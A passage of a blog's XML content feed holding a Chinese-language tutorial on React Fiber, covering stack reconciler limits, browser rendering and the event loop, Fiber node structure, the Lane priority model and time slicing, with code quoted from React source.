align="left">has</td><td align="left">对应 in 操作符</td></tr><tr><td align="left">属性删除</td><td align="left">-</td><td align="left">deleteProperty</td><td align="left">对应 delete 操作符</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>JavaScript</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JavaScript</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>React Fiber 专题知识学习</title>
    <link href="/2025/06/05/React%20Fiber/"/>
    <url>/2025/06/05/React%20Fiber/</url>
    
    <content type="html"><![CDATA[<h1 id="第一章：React-Fiber-的诞生背景"><a href="#第一章：React-Fiber-的诞生背景" class="headerlink" title="第一章：React Fiber 的诞生背景"></a>第一章：React Fiber 的诞生背景</h1><h2 id="1-1-React15-及之前版本的渲染瓶颈"><a href="#1-1-React15-及之前版本的渲染瓶颈" class="headerlink" title="1.1 React15 及之前版本的渲染瓶颈"></a>1.1 React15 及之前版本的渲染瓶颈</h2><h3 id="递归不可中断的协调过程（stack-reconciler栈协调器）"><a href="#递归不可中断的协调过程（stack-reconciler栈协调器）" class="headerlink" title="递归不可中断的协调过程（stack reconciler栈协调器）"></a>递归不可中断的协调过程（stack reconciler栈协调器）</h3><p><strong>stack reconciler 是什么？</strong></p><p>stack reconciler 是 React15 及之前版本中使用的虚拟 dom 协调算法，负责计算组件树的变化并更新真实 dom。其核心特点是基于递归遍历、不可中断的同步更新流程。</p><p><strong>递归遍历虚拟 dom</strong></p><p>采用深度优先遍历策略（FDS），从组件树根节点开始，递归调用组件的 render 方法，生成完整的虚拟 dom 树。递归遍历依赖于 JavaScript 调用栈（call stack），一旦开始就必须执行到底，无法中途暂停。</p><p><strong>同步更新机制</strong></p><p>所有更新（比如 setState）都会立即触发完整的 diff 计算，无法合并和延迟。当一个应用的组件树过于庞大时，一次递归 diff 计算是十分耗时的。stack reconciler 的工作流程分为两个阶段：</p><ul><li>协调（reconciliation）：该阶段中采用递归 diff 算法，对比新旧虚拟 dom 树的差异，找到需要进行更新的树节点，标记需要更新的节点的增删改</li><li>提交（commit）：根据 diff 计算的结果，一次性同步执行所有的 dom 操作，并触发生命周期钩子（componentDidMount、componentDidUpdate等）</li></ul><p><strong>局限性</strong></p><p>在了解上述知识后，我们可以很清晰的感知到 stack reconciler 的局限性：</p><ul><li>无法中断长任务：递归遍历一旦开始就无法中断，这会占用 js 主线程，导致无法响应其他高优先级任务</li><li>缺乏任务优先级调度：所有的更新任务同步执行，享有同等优先级</li><li>内存泄漏风险：当组件树十分庞大时，深度递归可能会引起栈内存泄漏</li></ul><span id="more"></span><h3 id="大型应用中的掉帧问题和用户体验缺陷"><a href="#大型应用中的掉帧问题和用户体验缺陷" class="headerlink" title="大型应用中的掉帧问题和用户体验缺陷"></a>大型应用中的掉帧问题和用户体验缺陷</h3><p><strong>“帧”是什么？</strong></p><p>在计算机图形学与交互式应用中，帧是指屏幕画面的一次完整更新，它是衡量画面流畅度的核心单位，帧率（FPS）即是指每秒内渲染的帧数，人眼视觉对 60FPS 以上的变化感知有限，但低于 60FPS 时则会感知到延迟、卡顿。主流浏览器的帧率大多为 60FPS ，即每帧 16.67ms。</p><p><strong>什么是掉帧，掉帧是怎么引起的？</strong></p><p>掉帧即是指帧率未达预期，导致动画或交互卡顿。以浏览器举例，预期帧率 60FPS，则每一帧（16.67ms）的生命周期内，浏览器需要完成 js 执行、样式计算（style）、布局（layout）、绘制（paint）、合成（composite）等步骤，否则就会导致掉帧。</p><h2 id="1-2-浏览器渲染机制与主线程阻塞"><a href="#1-2-浏览器渲染机制与主线程阻塞" class="headerlink" title="1.2 浏览器渲染机制与主线程阻塞"></a>1.2 浏览器渲染机制与主线程阻塞</h2><h3 id="渲染机制"><a href="#渲染机制" class="headerlink" title="渲染机制"></a>渲染机制</h3><p>浏览器渲染过程是指浏览器将 HTML、CSS、JavaScript 等代码转换为用户可视界面的过程。浏览器通过多线程协作提高渲染效率，其中关键线程的分工如下：</p><table><thead><tr><th align="left">线程</th><th align="left">职责</th><th align="left">示例场景</th></tr></thead><tbody><tr><td align="left">主线程（Main Thread）</td><td align="left">运行 JavaScript、DOM&#x2F;CSS 解析、样式计算、布局、绘制、生成绘制指令</td><td align="left">setTimeout、React 渲染、事件处理</td></tr><tr><td align="left">合成器线程（Compositor Thread）</td><td align="left">接收绘制指令、图层分块光栅化、加速图层合成、提交 GPU 显示</td><td align="left">滚动、动画（如 transform 动画）</td></tr><tr><td align="left">光栅化线程（Raster Thread）</td><td align="left">将绘制指令转换为位图</td><td align="left">处理图片解码、图层分块光栅化</td></tr></tbody></table><p>正如上一章节所讲，浏览器渲染过程涉及多个阶段，且与主线程（Main Thread）紧密相关：</p><ol><li>解析阶段：解析 HTML （遇到<code>&lt;script&gt;</code>标签时会阻塞解析）和 CSS，生成 DOM 和 CSSOM</li><li>样式计算阶段：将 DOM 和 CSSOM 合并，生成渲染树，树仅包含可见节点，并计算节点的最终样式</li><li>布局阶段：根据渲染树计算每个节点的精确位置和大小</li><li>绘制阶段：生成绘制指令，将布局结果转换为屏幕上的像素，输出绘制列表，记录绘制顺序</li><li>合成阶段：将页面分为多个图层并启用 GPU 加速合成</li><li>显示阶段：将合成后的位图通过显卡驱动传递给屏幕显示</li></ol><p>浏览器的一次渲染过程即对应一帧的生成，单次渲染过程耗时过长即会导致帧率下降，即所谓的<code>掉帧</code>。结合浏览器关键线程分工职责和渲染过程的知识，可以知道，导致单次渲染耗时过长的原因有很多，与前端开发者息息相关的就是<code>主线程阻塞</code>。为了分析引起主线程阻塞的原因，我们还需要额外学习部分知识。</p><h3 id="事件循环"><a href="#事件循环" class="headerlink" title="事件循环"></a>事件循环</h3><p><strong>JavaScript 的事件循环是什么？</strong></p><p>JavaScript 的事件循环是其异步编程的核心机制，它决定了代码的执行顺序，使得单线程的 JavaScript 可以处理非阻塞任务</p><p><strong>核心组成</strong></p><p>事件循环的核心组成是<code>调用栈</code>和<code>任务队列</code>：</p><ul><li>调用栈：按顺序执行同步代码，后进先出（LIFO），执行一个函数时，将其压入栈顶，函数返回后弹出。如果栈溢出（比如深度递归）会抛出异常。</li><li>任务队列：存储待执行的异步回调，分为宏任务队列、微任务队列、其他队列（比如requestAnimationFrame、web workers）。</li></ul><p>调用栈与任务队列的协作模型的核心规则：</p><ul><li>同步代码属于当前宏任务，直接由调用栈执行</li><li>异步任务分为宏任务、微任务两类，每次事件循环只执行一个宏任务，微任务必须在当前宏任务结束后立即执行，且必须清空队列</li></ul><p><strong>工作流程&#x2F;执行顺序</strong></p><ol><li>执行当前调用栈中的同步代码（属于当前宏任务）</li><li>执行所有微任务，直到微任务队列为空</li><li>必要时渲染页面（浏览器决定）</li><li>从宏任务队列中取出一个任务执行（回到步骤 1）</li></ol><p><strong>核心规则</strong></p><p>同步代码 &gt; 微任务 &gt; 渲染 &gt; 宏任务</p><h3 id="布局抖动（Layout-Thrashing）"><a href="#布局抖动（Layout-Thrashing）" class="headerlink" title="布局抖动（Layout Thrashing）"></a>布局抖动（Layout Thrashing）</h3><p><strong>什么是布局抖动？</strong></p><p>布局是指浏览器计算渲染树中每个节点的几何信息（精确位置、大小）的过程，发生在样式计算之后、绘制之前。修改影响几何属性的 CSS（如 width、margin）或读取布局属性（如 offsetWidth）都会触发布局重排。</p><p>布局抖动是指浏览器因频繁的强制同步布局造成的性能问题，表现为多次不必要的布局计算（<code>重排/Reflow</code>），影响页面渲染速度。其本质是代码中混合连续读写布局属性，迫使浏览器多次重新计算布局</p><p><strong>常见触发场景</strong></p><ul><li>循环中读写布局属性</li><li>频繁访问布局 API：offsetTop、offsetLeft、scrollTop、getComputedStyle() 等</li><li>动画中混合读写</li></ul><h3 id="长任务（Long-Task）"><a href="#长任务（Long-Task）" class="headerlink" title="长任务（Long Task）"></a>长任务（Long Task）</h3><p><strong>什么是长任务？</strong></p><p>长任务是指主线程上连续执行时间超过 50ms 的 JavaScript 代码或渲染操作，它会阻塞用户交互和页面渲染，导致明显的卡顿</p><p><strong>长任务的标准</strong></p><ul><li>时间阈值：50ms，是由 Google 根据人类感知延迟提出的临界值</li><li>检测工具：Chrome DevTools 的 Performance 面板中，长任务会被标记为红色区块并显示 Long Task 警告</li></ul><p><strong>常见的长任务场景</strong></p><ul><li>复杂的 JavaScript 计算</li><li>未优化的 dom 操作</li><li>同步网络请求</li><li>加载未优化的三方脚本</li></ul><p><strong>长任务优化手段</strong></p><ul><li>任务拆分</li><li>web workers 多线程：将计算密集型任务转到worker</li><li>异步编程优化：通过 promise、async&#x2F;await 等手段避免阻塞</li><li>虚拟列表优化渲染：仅渲染可视区域内容</li><li>惰性加载：按需加载非关键脚本</li></ul><h3 id="主线程阻塞原因分析"><a href="#主线程阻塞原因分析" class="headerlink" title="主线程阻塞原因分析"></a>主线程阻塞原因分析</h3><p>现在，我们可以知道，引起主线程阻塞的主要原因有以下几点：</p><ul><li>布局抖动</li><li>长任务</li><li>过多的微任务</li></ul><h2 id="1-3-现代前端应用的需求演进"><a href="#1-3-现代前端应用的需求演进" class="headerlink" title="1.3 现代前端应用的需求演进"></a>1.3 现代前端应用的需求演进</h2><h3 id="动画-手势的高优先级更新"><a href="#动画-手势的高优先级更新" class="headerlink" title="动画&#x2F;手势的高优先级更新"></a>动画&#x2F;手势的高优先级更新</h3><p>在现代前端应用中，动画&#x2F;手势的高优先级更新是提升用户体验（UX）和界面流畅性的关键设计，其意义有以下几个方面：</p><ul><li>确保交互即时响应</li><li>避免掉帧现象的发生</li><li>提升手势操作的跟手性</li><li>支持复杂的 UI 设计：拖拽、捏合缩放、页面过渡动画等复杂交互依赖高优先级更新</li><li>与浏览器渲染管线的协同优化：高优先级动画（如 transform）可由合成器线程直接处理，无需主线程参与，从而避免布局&#x2F;重绘</li></ul><p>通过优先级调度策略，可以提升用户留存率和满意度。</p><h3 id="异步数据加载与Suspense的诉求"><a href="#异步数据加载与Suspense的诉求" class="headerlink" title="异步数据加载与Suspense的诉求"></a>异步数据加载与Suspense的诉求</h3><p>传统前端应用中，通常会遇到以下几大问题：</p><ul><li>“白屏”等待：传统应用在数据加载完全前，页面通常显示空白或 loading 图标，用户无法感知进度。</li><li>不必要的加载状态：传统模式下，各个组件独立维护 loading 状态，会导致多次闪烁的 loading 提示</li><li>竞态条件问题：典型场景是快速切换标签页时，前一次请求可能覆盖后一次请求的结果，比如从详情 A 跳到详情 B</li></ul><p>而现代前端应用中，这些问题是严重影响用户体验的，针对以上问题，衍生出了以下现代需求：</p><ul><li>骨架屏：在数据加载时显示占位 UI，提升感知速度</li><li>流式渲染：逐步发送 HTML 片段，让用户尽早看到内容</li><li>状态统一：统一管理数据状态，仅在所有数据就绪后一次性渲染</li><li>AbortController：可中断正在进行的异步操作，避免资源浪费和竞态条件</li></ul><p>这就要求应用在数据管理方案上能支持异步数据管理，因此 React 团队提出了Suspense 声明式异步数据管理方案。</p><p>为了解决 React15 及之前版本的渲染问题，应对日益激增的现代前端应用需求，React Fiber 架构于 16.x 版本诞生，并于后续版本中逐步优化完善。</p><h1 id="第二章：Fiber架构的核心设计思想"><a href="#第二章：Fiber架构的核心设计思想" class="headerlink" title="第二章：Fiber架构的核心设计思想"></a>第二章：Fiber架构的核心设计思想</h1><h2 id="2-1-Fiber-的三大角色定义"><a href="#2-1-Fiber-的三大角色定义" class="headerlink" title="2.1 Fiber 的三大角色定义"></a>2.1 Fiber 的三大角色定义</h2><h3 id="作为数据结构的Fiber节点（链表节点）"><a href="#作为数据结构的Fiber节点（链表节点）" class="headerlink" title="作为数据结构的Fiber节点（链表节点）"></a>作为数据结构的Fiber节点（链表节点）</h3><p>每个 Fiber 节点是一个 JavaScript 对象，React <a href="https://github.com/facebook/react/blob/1f5ce59dd7b6869b1a17ede65aa301002ef31d4b/packages/react-reconciler/src/ReactFiber.js#L134">源码</a>中对 Fiber 节点的定义如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">FiberNode</span>(<span class="hljs-params"></span><br><span class="hljs-params">  <span class="hljs-variable language_">this</span>: $FlowFixMe,</span><br><span class="hljs-params">  tag: WorkTag,</span><br><span class="hljs-params">  pendingProps: mixed,</span><br><span class="hljs-params">  key: <span class="hljs-literal">null</span> | string,</span><br><span class="hljs-params">  mode: TypeOfMode,</span><br><span class="hljs-params"></span>) &#123;<br>  <span class="hljs-comment">// Instance</span><br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">tag</span> = tag;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">key</span> = key;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">elementType</span> = <span class="hljs-literal">null</span>;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">type</span> = <span class="hljs-literal">null</span>;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">stateNode</span> = <span class="hljs-literal">null</span>;<br><br>  <span class="hljs-comment">// Fiber</span><br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">return</span> = <span class="hljs-literal">null</span>;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">child</span> = <span class="hljs-literal">null</span>;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">sibling</span> = <span class="hljs-literal">null</span>;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">index</span> = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">ref</span> = <span class="hljs-literal">null</span>;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">refCleanup</span> = <span class="hljs-literal">null</span>;<br><br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">pendingProps</span> = pendingProps;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">memoizedProps</span> = <span class="hljs-literal">null</span>;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">updateQueue</span> = <span class="hljs-literal">null</span>;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">memoizedState</span> = <span class="hljs-literal">null</span>;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">dependencies</span> = <span class="hljs-literal">null</span>;<br><br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">mode</span> = mode;<br><br>  <span class="hljs-comment">// Effects</span><br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">flags</span> = <span class="hljs-title class_">NoFlags</span>;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">subtreeFlags</span> = <span class="hljs-title class_">NoFlags</span>;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">deletions</span> = <span class="hljs-literal">null</span>;<br><br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">lanes</span> = <span class="hljs-title class_">NoLanes</span>;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">childLanes</span> = <span class="hljs-title class_">NoLanes</span>;<br><br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">alternate</span> = <span class="hljs-literal">null</span>;<br><br>  <span class="hljs-keyword">if</span> (enableProfilerTimer) &#123;<br>    <span class="hljs-comment">// Note: The following is done to avoid a v8 performance cliff.</span><br>    <span class="hljs-comment">//</span><br>    <span class="hljs-comment">// Initializing the fields below to smis and later updating them with</span><br>    <span class="hljs-comment">// double values will cause Fibers to end up having separate shapes.</span><br>    <span class="hljs-comment">// This behavior/bug has something to do with Object.preventExtension().</span><br>    <span class="hljs-comment">// Fortunately this only impacts DEV builds.</span><br>    <span class="hljs-comment">// Unfortunately it makes React unusably slow for some applications.</span><br>    <span class="hljs-comment">// To work around this, initialize the fields below with doubles.</span><br>    <span class="hljs-comment">//</span><br>    <span class="hljs-comment">// Learn more about this here:</span><br>    <span class="hljs-comment">// https://github.com/facebook/react/issues/14365</span><br>    <span class="hljs-comment">// https://bugs.chromium.org/p/v8/issues/detail?id=8538</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">actualDuration</span> = <span class="hljs-title class_">Number</span>.<span class="hljs-property">NaN</span>;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">actualStartTime</span> = <span class="hljs-title class_">Number</span>.<span class="hljs-property">NaN</span>;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">selfBaseDuration</span> = <span class="hljs-title class_">Number</span>.<span class="hljs-property">NaN</span>;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">treeBaseDuration</span> = <span class="hljs-title class_">Number</span>.<span class="hljs-property">NaN</span>;<br><br>    <span class="hljs-comment">// It&#x27;s okay to replace the initial doubles with smis after initialization.</span><br>    <span class="hljs-comment">// This won&#x27;t trigger the performance cliff mentioned above,</span><br>    <span class="hljs-comment">// and it simplifies other profiler code (including DevTools).</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">actualDuration</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">actualStartTime</span> = -<span class="hljs-number">1</span>;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">selfBaseDuration</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">treeBaseDuration</span> = <span class="hljs-number">0</span>;<br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (__DEV__) &#123;<br>    <span class="hljs-comment">// This isn&#x27;t directly used but is handy for debugging internals:</span><br><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">_debugSource</span> = <span class="hljs-literal">null</span>;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">_debugOwner</span> = <span class="hljs-literal">null</span>;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">_debugNeedsRemount</span> = <span class="hljs-literal">false</span>;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">_debugHookTypes</span> = <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">if</span> (!hasBadMapPolyfill &amp;&amp; <span class="hljs-keyword">typeof</span> <span class="hljs-title class_">Object</span>.<span class="hljs-property">preventExtensions</span> === <span class="hljs-string">&#x27;function&#x27;</span>) &#123;<br>      <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">preventExtensions</span>(<span class="hljs-variable language_">this</span>);<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="作为执行单元的任务分片（Unit-of-Work）"><a href="#作为执行单元的任务分片（Unit-of-Work）" class="headerlink" title="作为执行单元的任务分片（Unit of Work）"></a>作为执行单元的任务分片（Unit of Work）</h3><p>在第一章节中，我们了解了长任务的相关知识，知道长任务会阻塞主线程，引起掉帧问题。为了解决这个问题，我们需要将长任务进行拆分，并在浏览器的每一帧中限制主线程执行任务的时间（React 默认初始时间是 <a href="https://github.com/facebook/react/blob/1fb18e22ae66fdb1dc127347e169e73948778e5a/packages/scheduler/src/forks/SchedulerHostConfig.default.js#L119">5ms</a>），这种将长任务拆成多段微小任务的技术被称为<code>任务分片</code>，分配到每一帧中去执行的操作被称为<code>时间切片</code>，二者协同实现 React 的高效渲染。</p><p>实现任务分片的关键是将同步更新变为可中断的异步更新：</p><ol><li>构建链表树：通过 Fiber 节点的链表结构构建链表树，替代递归调用栈</li><li>分片执行：React 通过循环逐个处理 Fiber 节点，每处理完一个节点后检查剩余时间，决定继续还是暂停</li><li>中断和恢复：当有高优先级任务（如用户点击）或当前分片时间用尽时暂停任务，通过保存当前处理的 Fiber 节点指针，下次从断点继续</li></ol><h3 id="作为调度单位的优先级载体（Lane模型）"><a href="#作为调度单位的优先级载体（Lane模型）" class="headerlink" title="作为调度单位的优先级载体（Lane模型）"></a>作为调度单位的优先级载体（Lane模型）</h3><p>React Fiber 架构中实现任务优先级调度的核心思想是：将优先级信息分散在 Fiber 树的各个节点和更新信息中，通过动态计算（lanes）和调度器（scheduler）的协作实现优先级调度。</p><p><strong>Lane（车道）的定义</strong></p><ul><li>每个 Lane 是一个32位的二进制位</li><li>每个二进制位代表一种优先级类型</li><li>数字越小（位越低）优先级越高</li><li>Lane 互斥</li></ul><p><strong>Lane 的类型</strong></p><p>React 18 版本中定义的类型有以下几种：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 优先级从高到低</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">SyncLane</span>: <span class="hljs-title class_">Lane</span> = <span class="hljs-number">0b0000000000000000000000000000001</span>; <span class="hljs-comment">// 同步任务（最高）</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">InputContinuousLane</span>: <span class="hljs-title class_">Lane</span> = <span class="hljs-number">0b0000000000000000000000000000100</span>; <span class="hljs-comment">// 用户输入</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">DefaultLane</span>: <span class="hljs-title class_">Lane</span> = <span class="hljs-number">0b0000000000000000000000000100000</span>; <span class="hljs-comment">// 默认更新</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">TransitionLane</span>: <span class="hljs-title class_">Lane</span> = <span class="hljs-number">0b0000000000000000001000000000000</span>; <span class="hljs-comment">// 过渡更新，比如useTransition</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">IdleLane</span>: <span class="hljs-title class_">Lane</span> = <span class="hljs-number">0b0100000000000000000000000000000</span>; <span class="hljs-comment">// 空闲任务（最低）</span><br></code></pre></td></tr></table></figure><p><strong>Lane 集合（Lanes）</strong></p><p>多个 Lane 可以组合：<code>lanes = InputLane | DefaultLane</code>，表示一组需要处理的优先级集合</p><p><strong>Lane 模型的工作原理</strong></p><ol><li>优先级分配：更新阶段根据交互类型分配 Lane</li><li>优先级收集：每个 Fiber 节点对象都有 <code>lanes</code> 属性和 <code>childLanes</code> 属性，lanes 属性保存该节点需要处理的优先级合集，childLanes 属性保存子节点中所有未处理的优先级合集</li><li>优先级调度：Fiber 树根节点合并所有子节点的 lanes 和 childLanes -&gt; 从合并后的优先级合集中选取最高优先级的 Lane 进行处理 -&gt; 只处理与选定 Lane 匹配的更新</li></ol><p>这里先只做简单的概念了解，详细知识将在 4.1 章节中进行讲解。</p><h2 id="2-2-关键设计目标"><a href="#2-2-关键设计目标" class="headerlink" title="2.2 关键设计目标"></a>2.2 关键设计目标</h2><p>我们已经知道在 React15 及之前版本中，渲染一旦开始便无法中断，并且所有任务同步进行，享有同等优先级，会导致交互延迟。Fiber 架构为了解决这些问题的核心设计目标有三个</p><h3 id="可中断、可恢复的渲染流程"><a href="#可中断、可恢复的渲染流程" class="headerlink" title="可中断、可恢复的渲染流程"></a>可中断、可恢复的渲染流程</h3><p><strong>关键设计</strong></p><p>要实现可中断、可恢复的渲染流程，关键设计有三点：</p><ul><li>链表结构替代递归结构：Fiber 通过 <code>child、sibling、return</code>构成树形链表</li><li>全局指针跟踪进度：<code>nextUnitOfWork</code>记录当前处理节点</li><li>双缓存机制：<code>current tree</code> 和 <code>work-in-progress tree</code> 两棵树交替更新</li></ul><p><strong>完整流程</strong></p><pre class="mermaid">graph TD    A[触发更新] --> B{有高优先级任务}    B -->|是| C[中断当前任务]    B -->|否| D[开始Render阶段]    D --> E[处理Fiber节点]    E --> F{时间用完}    F -->|是| C    F -->|否| G{还有子节点}    G -->|是| H[移动到子节点]    G -->|否| I{还有兄弟节点}    I -->|是| J[移动到兄弟节点]    I -->|否| K[回溯到父节点]    K --> L{根节点}    L -->|否| E    L -->|是| M[完成Render阶段]    M --> N[Commit阶段]    N --> O[更新DOM]    C --> P[保存进度]    P --> Q[执行高优先级任务]    Q --> R[恢复低优先级任务]</pre><p><strong>实现原理</strong></p><ol><li>渲染阶段可中断，核心代码如下：</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">let</span> nextUnitOfWork = <span class="hljs-literal">null</span>; <span class="hljs-comment">// 全局工作指针</span><br><br><span class="hljs-comment">// 主工作循环</span><br><br><span class="hljs-comment">/** <span class="hljs-doctag">@noinline</span> */</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">workLoopConcurrentByScheduler</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-comment">// Perform work until Scheduler asks us to yield</span><br>  <span class="hljs-keyword">while</span> (workInProgress !== <span class="hljs-literal">null</span> &amp;&amp; !<span class="hljs-title function_">shouldYield</span>()) &#123;<br>    <span class="hljs-comment">// $FlowFixMe[incompatible-call] flow doesn&#x27;t know that shouldYield() is side-effect free</span><br>    <span class="hljs-title function_">performUnitOfWork</span>(workInProgress);<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// 检查是否需要中断</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">shouldYield</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> deadline.<span class="hljs-title function_">timeRemaining</span>() &lt; <span class="hljs-number">1</span> || <br>         <span class="hljs-title function_">hasHigherPriorityWork</span>(); <span class="hljs-comment">// 高优先级任务到达</span><br>&#125;<br></code></pre></td></tr></table></figure><ol start="2"><li>进度保存和恢复：中断时保留 <code>nextUnitOfWork</code> 指针指向未完成的 Fiber 节点，恢复时从上次中断的节点继续遍历，采用深度优先遍历策略，优先处理子节点（<code>child</code>），无子节点时处理兄弟节点（<code>sibling</code>），无兄弟节点时回溯父节点（<code>return</code>）</li><li>双缓存保证一致性：current tree 展示当前界面，中断时保持不变，work-in-progress tree 构建新的 Fiber 树，构建完成后一次性替换 current tree 变成新的 current tree</li></ol><p>React Fiber 架构通过可中断、可恢复的渲染流程拥有类似于操作系统的“多任务处理”能力，最终实现渲染不阻塞交互的用户体验</p><h3 id="时间切片（Time-Slicing）与增量渲染"><a href="#时间切片（Time-Slicing）与增量渲染" class="headerlink" title="时间切片（Time Slicing）与增量渲染"></a>时间切片（Time Slicing）与增量渲染</h3><p>在 React Fiber 中，时间切片和增量渲染是两个紧密相关的核心概念，共同解决了渲染过程中主线程阻塞的问题，但他们的关注点不同</p><p><strong>时间切片 - 时间维度的解决方案</strong></p><p>时间切片是将连续长任务切割成多个微小任务，并分散在浏览器的多个渲染帧中去执行的技术</p><p>它的核心目标有 2 个：</p><ul><li>防止 JavaScript 代码执行时间超过 50ms</li><li>保证浏览器的每一帧中有足够的时间去执行渲染、动画和交互</li></ul><p>其核心实现原理是通过 <code>requestIdleCallback</code>（React17及以下） 或 <code>MessageChannel</code>（React18） 来检测剩余时间，当时间用尽时中断任务并保存状态，下次空余时间到来时从中断点恢复</p><p><strong>增量渲染 - 任务维度的解决方案</strong></p><p>增量渲染是将整个渲染过程分解为多个可独立执行的子任务，并按优先级逐步完成的技术</p><p>它的核心目标是：</p><ul><li>将大型渲染任务分解为可独立执行的小任务</li><li>允许先呈现部分内容，再逐步补充剩余内容</li></ul><p>其实现原理是通过任务分片将组件树拆分为 Fiber 节点链表，通过 Lane 模型区分任务优先级，完成的部分先提交呈现，并结合双缓存机制保证渲染过程不影响当前显示：</p><pre class="mermaid">graph LRA[开始渲染] --> B[处理根节点]B --> C[处理子节点1]C --> D[处理子节点1.1]D --> E[提交已完成部分]E --> F[处理兄弟节点1.2]F --> G{时间用尽}G -->|是| H[保存状态并暂停]G -->|否| I[继续处理]</pre><p>时间切片和增量渲染协同工作流程如下：</p><ol><li>增量渲染拆解任务：将整个渲染任务拆分为 Fiber 